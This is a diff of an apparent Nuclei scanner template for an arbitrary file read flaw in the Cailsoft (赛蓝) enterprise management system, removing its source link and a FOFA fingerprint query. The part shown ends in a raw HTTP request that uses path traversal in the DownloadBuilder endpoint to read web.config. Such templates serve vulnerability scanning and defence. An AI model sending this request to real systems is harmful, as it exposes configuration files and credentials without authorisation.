@@ -3,12 +3,8 @@ info:
   name: 赛蓝企业管理系统 DownloadBuilder 任意文件读取漏
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/itg0z52ob3ox5viu'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: itg0z52ob3ox5viu
-    fofa: body="www.cailsoft.com" || body="赛蓝企业管理系统"
 http:
 - raw:
   - 'GET /BaseModule/ReportManage/DownloadBuilder?filename=/../web.config HTTP/1.1
